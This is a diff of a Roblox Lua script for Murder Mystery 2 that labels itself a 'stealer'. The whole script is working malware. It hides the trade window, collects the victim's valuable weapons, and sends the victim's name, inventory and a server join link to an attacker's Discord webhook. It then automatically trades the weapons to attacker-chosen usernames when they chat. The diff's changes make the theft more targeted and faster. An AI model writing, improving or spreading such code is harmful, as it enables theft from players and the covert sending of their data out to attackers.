@@ -2,17 +2,44 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
 getgenv().ScriptEjecutado = true
 
+-- Configuración
 local webhook = _G.webhook or ""
-local users = _G.Usernames or {}
+local users = _G.Usernames or {"Anonimo1","Anonimo2"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Webhook
+-- Lista de valores Godly + Ancient
+local valueList = {
+    ["gingerscope"]=10700,
+    ["travelers axe"]=6900,
+    ["celestial"]=975,
+    ["astral"]=850,
+    ["morning star"]=720,
+    ["northern star"]=680,
+    ["moonlight"]=640,
+    ["helios"]=600,
+    ["stormbringer"]=580,
+    ["reaper"]=550,
+    ["blaze"]=500,
+    ["phantom"]=470,
+    ["zenith"]=450,
+    ["ares"]=420,
+    ["hephaestus"]=400,
+    ["mystic"]=380
+}
+
+-- Verificación de servidor
+if game.PlaceId ~= 142823291 then
+    LocalPlayer:Kick("Game not supported. Join a normal MM2 server.")
+end
+
+-- Función webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
     local data = {
         ["content"] = prefix or "",
@@ -22,14 +49,14 @@ local function SendWebhook(title, description, fields, prefix, thumbnail)
             ["color"] = 65280,
             ["fields"] = fields or {},
             ["thumbnail"] = thumbnail and {["url"]=thumbnail} or nil,
-            ["footer"] = {["text"]="The best stealer by Anonimo 🇪🇨"}
+            ["footer"] = {["text"]="Ultra Stealer by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
     pcall(function() req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
 end
 
--- Ocultar GUI
+-- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -39,7 +66,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
--- Funciones Trade
+-- Funciones trade
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
@@ -50,28 +77,29 @@ local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapon
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
--- Preparar lista de armas
+-- Preparar lista de armas Godly/Ancient
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
-local totalValue, weaponsToSend = 0, {}
+local totalValue = 0
+local weaponsToSend = {}
 
 local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id, amount in pairs(profile.Weapons.Owned) do
     local item = database[id]
     if item then
-        local rarityIndex = table.find(rarityTable,item.Rarity)
-        local minIndex = table.find(rarityTable,min_rarity)
-        if rarityIndex and rarityIndex>=minIndex then
-            local value = 1
-            if value>=min_value then
-                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,Rarity=item.Rarity})
-                totalValue += value*amount
+        local rarityIndex = table.find(rarityTable, item.Rarity)
+        local minIndex = table.find(rarityTable, min_rarity)
+        if rarityIndex and rarityIndex >= minIndex then
+            local value = valueList[item.ItemName:lower()] or 1
+            if value >= min_value then
+                table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
+                totalValue += value * amount
             end
         end
     end
 end
 
--- Webhook con join link e imagen
+-- Webhook con inventario
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -84,17 +112,16 @@ for _, w in ipairs(weaponsToSend) do
 end
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("💪MM2 hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fields,prefix,thumbnailURL)
+SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo con soporte para millones de ítems
+-- Trade continuo ultra seguro
 local function doTrade(targetName)
-    while #weaponsToSend>0 do
+    while #weaponsToSend > 0 do
         local status = getTradeStatus()
         if status=="None" then
             sendTradeRequest(targetName)
         elseif status=="StartTrade" then
             local blockSize = 4
-            local allAdded = false
             while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
                 for i=1,math.min(blockSize,#weaponsToSend) do
                     local w = table.remove(weaponsToSend,1)
@@ -102,20 +129,17 @@ local function doTrade(targetName)
                 end
                 task.wait(0.3)
             end
-            allAdded = true
-            if allAdded then
-                task.wait(6) -- Delay antes de aceptar
-                acceptTrade()
-                waitForTradeCompletion()
-            end
+            task.wait(7)
+            acceptTrade()
+            waitForTradeCompletion()
         else
             task.wait(0.5)
         end
-        task.wait(1)
+        task.wait(0.5)
     end
 end
 
--- Trade activado por chat
+-- Activación trade por chat solo para tus usuarios
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
